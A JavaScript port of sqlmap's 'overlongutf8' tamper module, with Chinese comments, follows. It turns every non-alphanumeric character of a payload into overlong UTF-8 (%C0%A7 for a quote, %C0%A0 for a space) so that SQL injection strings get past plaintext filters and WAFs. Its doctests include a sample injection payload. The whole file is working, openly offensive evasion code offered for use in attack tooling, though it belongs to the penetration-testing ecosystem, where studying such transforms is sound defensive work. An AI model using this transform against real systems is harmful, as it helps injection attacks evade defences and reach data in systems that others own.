// 非字母数字字符转 UTF-8 超长编码（%C0%A7 一类），绕过基于明文字符的过滤
//
// [T-9 2026-10-07] 对齐上游 sqlmap 1.10.10 tamper/overlongutf8.py，修掉两处：
//   ① **编码公式是错的**：旧实现把引号映射成 `%C0%27` / `%C0%22` —— 那是把字符的
//      原码点 0x27/0x22 直接塞在 `C0` 后面，而超长 UTF-8 的**第二个字节必须是
//      0x80–0xBF 的续字节**（%27 / %22 不是）⇒ 产出的根本不是合法超长编码，
//      服务端要么报非法 UTF-8、要么按原样透传，"绕过引号过滤"从未真正发生。
//      正确公式：`C0 + (cp >> 6)` / `80 + (cp & 0x3F)` ⇒ `'` 是 `%C0%A7`。
//   ② **覆盖面**：旧实现只处理引号 ⇒ `SELECT ... WHERE 2>1` 这类**没有引号**的
//      payload 整条空转发包（上游覆盖空格 `%C0%A0`、比较符 `%C0%BE` 等全部非
//      字母数字字符）。同时沿用上游的两条护栏：已编码的 `%XX` 不再编码；
//      码点 > U+07FF 装不进两字节超长式 ⇒ 退回真实 UTF-8。
// ⚠️ 与上游同前提：只有在**目标侧会做超长 UTF-8 解码**时才成立（上游
//   PRIORITY.LOWEST），不是通用变换；本件不改变这一前提。
const HEXDIGITS = /^[0-9a-fA-F]$/;

export const overlongutf8 = {
  name: 'overlongutf8',
  description: '将非字母数字字符转 UTF-8 超长编码（\'=>%C0%A7, 空格→%C0%A0），绕过 plaintext 规则',
  doctests: [
    // 上游官方示例（tag 1.10.10）
    { input: 'SELECT FIELD FROM TABLE WHERE 2>1', output: 'SELECT%C0%A0FIELD%C0%A0FROM%C0%A0TABLE%C0%A0WHERE%C0%A02%C0%BE1' },
    // ① 引号的正确超长式（旧实现给的是 %C0%27）
    { input: "'", output: '%C0%A7' },
    { input: '"', output: '%C0%A2' },
    // ② 已编码的 %XX 不被二次编码
    { input: 'a%20b', output: 'a%20b' },
    { input: 'a b', output: 'a%C0%A0b' },
  ],
  /**
   * @param {string} payload
   * @returns {string}
   */
  transform(payload) {
    const src = String(payload ?? '');
    let out = '';
    let i = 0;
    while (i < src.length) {
      const ch = src[i];
      // 已是 %XX ⇒ 原样透传 3 个字符（不二次编码）
      if (ch === '%' && i + 2 < src.length && HEXDIGITS.test(src[i + 1]) && HEXDIGITS.test(src[i + 2])) {
        out += src.slice(i, i + 3);
        i += 3;
        continue;
      }
      const cp = src.codePointAt(i) ?? 0;
      if (!/[A-Za-z0-9]/.test(ch)) {
        if (cp <= 0x7ff) {
          const hi = (0xc0 + (cp >> 6)).toString(16).toUpperCase().padStart(2, '0');
          const lo = (0x80 + (cp & 0x3f)).toString(16).toUpperCase().padStart(2, '0');
          out += `%${hi}%${lo}`;
        } else {
          // 两字节超长式装不下 > U+07FF ⇒ 退回真实 UTF-8（上游同分支）
          for (const b of new TextEncoder().encode(String.fromCodePoint(cp))) {
            out += '%' + b.toString(16).toUpperCase().padStart(2, '0');
          }
        }
      } else out += ch;
      i += String.fromCodePoint(cp).length;
    }
    return out;
  },
};
export default overlongutf8;
